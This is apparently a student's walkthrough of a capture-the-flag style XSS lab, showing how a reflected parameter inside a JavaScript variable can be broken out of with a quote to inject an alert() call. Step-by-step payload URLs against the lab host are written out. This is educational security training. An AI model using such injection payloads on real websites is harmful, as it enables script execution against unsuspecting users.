XSS 06

Here, the source code of the HTML page is a bit different. 
If you read it, you will see that the value you are sending is echoed back inside JavaScript code. 
To get your alert box, you will not need to inject a script tag,you will just need to correctly complete the pre-existing JavaScript code
and add your own payload, then you will need to get rid of the code after your injection point by commenting it out (using //) or 
by adding some dummy code (var $dummy = ") to close it correctly.

 To finish this exercise, you need to trigger a pop-up (alert or confirm) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) 
 as argument <script>alert('dd19b1aa-7a48-4881-87ce-4fd3f96516f8')</script>. 

  You can access this exercise using the following URL: http://ptl-5f29f094-4803806f.libcurl.st/. 

    Steps:
        1) Visit the given URL: http://ptl-5f29f094-4803806f.libcurl.st/. 
        2) As before we can be redirected after 'click' to:  http://ptl-5f29f094-4803806f.libcurl.st/index.php?name=hacker
        3) Use (") in parameter and observe in source code.
            ----> http://ptl-5f29f094-4803806f.libcurl.st/index.php?name="
        4) In source code we can see:
            ----> var $a= """;
        5) Again make a payload on this basis:
          ---->  http://ptl-5f29f094-4803806f.libcurl.st/index.php?name= ";var  a="
            Then try to alert 1 on this site:
            ---->  http://ptl-5f29f094-4803806f.libcurl.st/index.php?name= ";alert('1');var  a="
        6) As we already pop-out '1', let's replace our UUID replacing '1'. See how:
           ----> http://ptl-5f29f094-4803806f.libcurl.st/index.php?name= ";alert('dd19b1aa-7a48-4881-87ce-4fd3f96516f8');var  a="
        7) As soon as this UUID be pop-out, submit the url.
        8) Bravo!! We've completed this lab too. Now

        Happy Hacking!! :)
